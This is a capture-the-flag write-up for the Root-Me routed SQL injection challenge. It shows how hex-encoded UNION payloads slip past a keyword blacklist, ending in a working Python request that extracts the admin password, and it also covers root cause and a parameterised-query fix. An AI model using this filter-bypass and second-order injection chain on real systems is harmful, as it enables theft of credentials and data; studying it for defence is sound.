# Root-Me — Web-Server / SQL Injection - Routed (ch49)

- **Target:** http://challenge01.root-me.org/web-serveur/ch49/
- **Class:** Routed SQL injection — second-order injection through a query's return value, plus a keyword blacklist bypassed with hex literals
- **Author / date:** soka, 24 December 2016
- **Goal:** find the admin password

## Flag (admin password)

```
qs89QdAs9A
```

Byte-exact: 10 chars, no trailing whitespace (`repr` = `'qs89QdAs9A'`, hex `71733839516441733941`).

Verified by effect — logging in as `admin` / `qs89QdAs9A` returns
*"You can validate the challenge with this password"*.

## The application

Two routes: the login form (`login`/`pass`) and `?action=search` (POST `login`).

The search endpoint runs **two** queries and prints a field from each:

```
[+] Requested login: admin
[+] Found ID: 3            <- Q1
[+] Email: admin@sqli_me.com   <- Q2
```

Reconstructed:

```php
// Q1 — injectable, and its result is used raw in Q2
$r1 = query("SELECT id FROM users WHERE login='$login'");
$row1 = fetch($r1);
echo "[+] Found ID: " . $row1['id'];

// Q2 — the "routed" second query; the value from Q1 is interpolated here
$r2 = query("SELECT id,email FROM users WHERE id='" . $row1['id'] . "'");
$row2 = fetch($r2);
echo "[+] Email: " . $row2['email'];
```

That is the routed pattern: the injection point is Q1, but **Q1's return value becomes
Q2's input**, giving a second injection point that never sees the original request.

## The blacklist

A WAF returns `Attack detected!`. Mapping it token-by-token:

| Blocked (case-insensitive) | Allowed |
|---|---|
| `or`, `and`, `xor`, `\|\|`, `&&`, `\|`, `&` | `union`, `select`, `where`, `like` |
| `from` | `--`, `#`, `;`, `'`, `=`, `<`, `>` |
| `,` | `0x…` hex literals, numbers |
| `(`, `"` | `left`, `right`, `instr`, `regexp`, `not`, `div`, `mod` |
| `substring`, `mid`, `ascii`, `rlike` | `having`, `limit`, `offset` |
| `password`, `passwd`, `secret`, `hash`, `md5`, `flag` | |
| `information_schema`, `database`, `order` | |
| `sleep`, `benchmark` | |

Two consequences:

1. **Every boolean operator is gone** (`or`, `and`, `xor`, `|`, `&`, `||`, `&&`), so no
   classic boolean-blind oracle.
2. **`from` is blocked**, so you cannot write `SELECT … FROM users` at all. Direct
   extraction from Q1 is dead:

   ```
   x' UNION SELECT password --                 -> Attack detected!
   x' UNION SELECT 1,password FROM users --    -> Attack detected!
   x' UNION SELECT 1,2 --                      -> Attack detected!  (comma)
   x' OR 1=1 --                                -> Attack detected!
   ```

This is what forces the routed path — and the blacklist is what makes the routing
*useful* rather than optional.

## Step 1 — Confirm Q1 is injectable and control its return value

```bash
x' UNION SELECT 3 --        -> Found ID: 3, Email: admin@sqli_me.com
x' UNION SELECT 0x616263 -- -> Found ID: (empty), Email: (empty)   # 'abc'
```

`UNION SELECT <constant>` works (1 column, no `from` needed), so Q1's return value is
fully attacker-controlled.

## Step 2 — Confirm the value is routed into Q2, and that Q2 quotes it

Q1's value is a *string*, so test whether Q2 interpolates it raw or inside quotes:

| Q1 returns | Result | Reading |
|---|---|---|
| `3` | `Email: admin@sqli_me.com` | works |
| `3'` | SQL syntax error | the quote is **live** → Q2 is quoted |
| `3' -- ` | `Email: admin@sqli_me.com` | the comment closes the quote → **Q2 = `id='$id'`** |

So Q2 is `SELECT id,email FROM users WHERE id='<Q1 value>'` and the value is **injectable**.

## Step 3 — The blacklist bypass: smuggle the Q2 payload as a hex literal

The WAF only inspects the **outer request** (the `login` POST field). Q1's return value is
constructed *by the database*, so anything inside a `0x…` hex literal is invisible to the
filter.

```python
q2_payload = "0' UNION SELECT 1,password FROM users WHERE login=0x61646d696e -- "
outer      = "x' UNION SELECT 0x" + q2_payload.encode().hex() + " -- "
```

The WAF sees only `x' UNION SELECT 0x3027…2d2d20 -- ` — no `from`, no `,`, no `password`,
no `or`. The database decodes the hex back into full SQL, which Q1 then returns and Q2
concatenates:

```sql
-- Q1
SELECT id FROM users WHERE login='x' UNION SELECT 0x<hex> -- '
-- Q2 (hex expanded)
SELECT id,email FROM users WHERE id='0' UNION SELECT 1,password FROM users WHERE login=0x61646d696e -- '
```

`0x61646d696e` = `admin`, avoiding quotes entirely.

## Step 4 — Map the result set

`SELECT *`-style mismatch gave the column count, and a marker pair located the printed field:

| Probe | Result | Conclusion |
|---|---|---|
| `0' UNION SELECT 1 -- ` | column-count mismatch | Q2 has ≠ 1 column |
| `0' UNION SELECT 1,2 -- ` | `Email: '1'` | Q2 has **2 columns** |
| `0' UNION SELECT 0x41,0x42 -- ` | `Email: 'B'` | printed field = **position 2** |
| `0' UNION SELECT 0x42,0x41 -- ` | `Email: 'A'` | confirms positional mapping |

Then the schema, via `information_schema` (also hex-smuggled):

```
column_name -> id, login, password, email
```

## Step 5 — Extract

Because position 2 is the printed one, put the password expression there:

```python
q2 = "0' UNION SELECT 1,password FROM users WHERE login=0x61646d696e -- "
```

```sql
SELECT id,email FROM users WHERE id='0' UNION SELECT 1,password FROM users WHERE login=0x61646d696e -- '
```

→ `Email: qs89QdAs9A`

Whole table, for completeness:

| id | login | password | email |
|---|---|---|---|
| 3 | **admin** | **qs89QdAs9A** | admin@sqli_me.com |
| 1 | jean | superpass | jean@sqli_me.com |
| 2 | michel | mypass | michel@sqli_me.com |

## Full one-liner

```python
import requests
S = "http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search"
q2 = "0' UNION SELECT 1,password FROM users WHERE login=0x61646d696e -- "
r = requests.post(S, data={"login": "x' UNION SELECT 0x" + q2.encode().hex() + " -- "})
print(r.text)   # -> [+] Email: qs89QdAs9A
```

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | `x' UNION SELECT password -- ` | blocked | `Attack detected!` |
| 2 | `x' UNION SELECT 1,password FROM users -- ` | blocked | `Attack detected!` |
| 3 | `x' UNION SELECT 1,2 -- ` | blocked (comma) | `Attack detected!` |
| 4 | `x' OR 1=1 -- ` | blocked | `Attack detected!` |
| 5 | Q1 returns `3` | routed, no injection | `Email: admin@sqli_me.com` |
| 6 | Q1 returns `3'` | breaks Q2's quoting | SQL syntax error |
| 7 | Q1 returns `3' -- ` | comment closes the quote | `Email: admin@sqli_me.com` |
| 8 | same payload **unhexed** | blocked | `Attack detected!` |
| 9 | admin / `wrong` on the login form | rejected | `Wrong login/password` |
| 10 | admin / `qs89QdAs9A` | accepted | *"You can validate the challenge…"* |

Controls 5–7 are what prove the *routing*: the value is not merely reflected, it is
concatenated into a second SQL string that is quoted (`3'` errors) and commentable
(`3' -- ` succeeds). Control 8 is the sharpest — the identical payload is blocked when
written literally and accepted when hex-encoded, so the bypass is the encoding, not a
missing check.

Note: the login form itself did **not** appear injectable (`admin' -- ` returned
`Wrong login/password`, no SQL error) — the search endpoint is the vulnerable path.

## Root cause

1. **Second-order / routed injection.** Q1 is written as if its result is data, but the
   result is concatenated into Q2 as code. Sanitising the *request* is useless when the
   dangerous string is manufactured by the database afterwards.
2. **No parameter binding anywhere.** Both queries interpolate with string concatenation
   (`login='$login'`, `id='$id'`).
3. **Blacklist as the only defence.** Blocking keywords is defeated by any encoding the
   database accepts — here a hex literal. The filter also had to block `from` to be
   effective, which is itself a signal that the query layer was unfixable by filtering.
4. **Verbose error output.** `The used SELECT statements have a different number of
   columns` and syntax errors let me derive the column count and quoting in three requests.
5. **Plaintext passwords** in a table reachable from the injected query.

## Fix

- **Parameterise both queries.** The routed bug disappears entirely if Q1's result is bound,
  not interpolated:

  ```php
  $st = $pdo->prepare("SELECT id FROM users WHERE login = ?");
  $st->execute([$login]);
  $id = $st->fetchColumn();

  $st = $pdo->prepare("SELECT id, email FROM users WHERE id = ?");
  $st->execute([$id]);            // $id is data, never code
  ```

- **Treat every value that reaches a query as untrusted** — including values that came from
  a previous query. Second-order injection is exactly the assumption "the database gave it
  to me, so it must be safe".
- **Never rely on blacklists.** They are trivially bypassed by hex literals, `char()`,
  case variation, comments, or the database's own decoding. If you must add a WAF, treat it
  as defence-in-depth only.
- **Least privilege.** The search endpoint only needs `SELECT` on `users.id`/`email`; it
  should not be able to read `information_schema` or the password column at all. Use a
  restricted DB user and a view that excludes secrets.
- **Hash passwords** (`password_hash()` / Argon2id) so a read primitive yields a digest.
- **Suppress SQL errors** in production (`display_errors=Off`, log server-side) and return a
  generic message — the error text did most of the schema recon for me.

## Generalisation

Routed / second-order injection shows up wherever a query result is reused as a query
fragment:

- `$id = $row['id']; query("SELECT * FROM t WHERE id=$id");`
- Values round-tripped through a session, cache, or file and then re-interpolated
- Stored procedures that build dynamic SQL from their own earlier results
- Any "I already validated this at the edge" assumption

The transferable technique here is worth remembering on its own: **when a filter inspects
the request but the payload is assembled by the database, move the payload into a literal
the filter cannot read** — `0x…` hex for MySQL, `CHAR()`/`CHR()`, or base64 for other
engines. Always check what the filter actually sees versus what the database actually
executes.
